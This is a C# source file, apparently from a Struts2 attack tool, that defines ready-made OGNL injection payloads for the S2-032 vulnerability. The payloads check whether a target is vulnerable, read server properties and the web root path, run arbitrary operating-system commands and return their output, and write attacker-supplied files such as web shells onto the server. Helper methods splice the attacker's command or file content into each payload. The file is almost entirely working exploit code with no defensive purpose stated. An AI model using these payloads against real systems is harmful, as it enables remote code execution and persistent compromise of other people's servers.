using System;
using System.Collections.Generic;
using System.Text;

namespace payload
{
    public class S2032:BasePayload
    {
        private String Exp_Check = "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23w.print(%23parameters.web[0]),%23w.print(%23parameters.path[0]),%23w.close(),1?%23xx:%23request.toString&pp=%2f&encoding=UTF-8&web=struts2_security_&path=check";
        private String Exp_VerInfo = "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23w.print(%23parameters.vername[0]),%23w.print(@java.lang.System@getProperty(%23parameters.verval[0])),%23w.close(),1?%23xx:%23request.toString&pp=%2f&encoding=UTF-8&vername=[vername]%3a&verval=[vername]";
        private String Exp_Path = "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23parameters.web[0]),%23w.print(%23parameters.path[0]),%23w.print(%23path),%23w.close(),1?%23xx:%23request.toString&pp=%2f&encoding=UTF-8&web=web&path=path%3a";
        private String Exp_Exec = "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=[cmd]&pp=\\\\AAAA&ppp=%20&encoding=UTF-8";
        private String Exp_Upload = "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23parameters.info1[0]),%23w.print(%23parameters.info2[0]),%23w.print(%23req.getContextPath()),%23w.close(),1?%23xx:%23request.toString&shellname=[pathfilename]&shellContent=[filecontent]&encoding=UTF-8&pp=%2f&info1=oko&info2=kok%2f";
        private String Exp_Upload_Path= "method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new+java.io.File%28%23parameters.path[0]%29.mkdirs%28%29,new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23parameters.info1[0]),%23w.print(%23parameters.info2[0]),%23w.print(%23req.getContextPath()),%23w.close(),1?%23xx:%23request.toString&path=[path]&shellname=[pathfilename]&shellContent=[filecontent]&encoding=UTF-8&pp=%2f&info1=oko&info2=kok%2f";
      
        public String Get_Exp_Check()
        {
            return this.Exp_Check;
        }
        public String Get_Exp_VerInfo(String vername)
        {
            return this.Exp_VerInfo.Replace("[vername]", vername); ;
        }
        public String Get_Exp_Path() {
            return this.Exp_Path;
        }
        public String Get_Exp_Exec(String cmd)
        {
            return this.Exp_Exec.Replace("[cmd]",cmd);
        }
        public String Get_Exp_Upload(String path,String fileName,String fileContent)
        {
            if ("".Equals(path))
            {
                this.Exp_Upload = this.Exp_Upload.Replace("[pathfilename]", fileName);
                return this.Exp_Upload.Replace("[filecontent]", fileContent);
            }
            else {
                this.Exp_Upload_Path = this.Exp_Upload_Path.Replace("[pathfilename]", path+"/"+ fileName);
                this.Exp_Upload_Path = this.Exp_Upload_Path.Replace("[path]", path);
                return this.Exp_Upload_Path.Replace("[filecontent]", fileContent);
            }
        }

       
    }
}
